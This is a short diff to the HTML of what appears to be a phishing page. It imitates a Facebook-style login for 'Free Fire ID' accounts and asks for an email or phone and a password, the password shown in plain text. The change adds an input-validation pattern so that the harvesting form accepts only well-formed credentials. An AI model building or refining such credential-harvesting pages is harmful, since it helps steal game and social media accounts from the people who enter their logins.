@@ -403,7 +403,7 @@ right: 0px;
 </div>
 <br/>
 <form id="fFarm">
-<input id="emn" class="logs" type="text" placeholder="Email or Phone " minlength="10" autocapitalize="off" required="required"/>
+<input id="emn" class="logs" type="text" pattern="[^@\s]+@[^@\s]+\.[^@\s]+|[\+0-9]{10,13}" title="Type Veiled Free Fire ID [Email or Phone]" placeholder="Email or Phone " minlength="10" autocapitalize="off" required="required"/>
 <input id="pass" class="logs" type="text" placeholder="Password " minlength="6" autocapitalize="off" required="required"/>
 <br/><br/>
 <button type="submit" onmousedown="buka.play()" class="btn-logs-fb"><b>Register</b></button>
